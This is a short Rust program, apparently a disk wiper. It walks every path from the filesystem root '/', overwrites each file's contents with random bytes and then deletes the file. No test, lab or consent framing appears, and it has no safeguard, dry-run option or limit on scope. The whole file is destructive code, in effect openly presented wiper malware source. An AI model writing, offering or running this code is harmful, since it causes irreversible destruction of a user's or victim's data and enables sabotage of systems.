use std::{fs, os::unix::prelude::FileExt};
use std::fs::metadata;
extern crate glob;
use jwalk::WalkDir;
use rand::Rng;
use std::io::Write;

fn main() -> std::io::Result<()> {
    burn_operation()?;
    Ok(())
}

    
fn burn_operation() -> std::io::Result<()> {
    //for every file on the computer, burn_file
    for file_path in WalkDir::new("/") {
        println!("Burning {}", file_path.as_ref().unwrap().path().display());
        burn_file(file_path.unwrap().path().display().to_string().as_str())?;
      }

   Ok(())
}


fn burn_file(path: &str) -> std::io::Result<()> {
    //get the file size
    let file_size = metadata(path)?.len();
    //create a random number generator
    let mut rng = rand::thread_rng();
    //open the file and give write permissions
    let mut f = std::fs::OpenOptions::new().write(true).open(path)?;
    //for each byte in the file, overwrite it with a random byte
    for i in 0..file_size { 
      let rand_byte = rng.gen::<u8>();
      f.write_at(&[rand_byte], i)?;
      
    }
    //ensure that every byte could be overwritten, if not return an error
    f.flush()?;
 
    //delete the file
    fs::remove_file(path)?;
    
    Ok(())
}


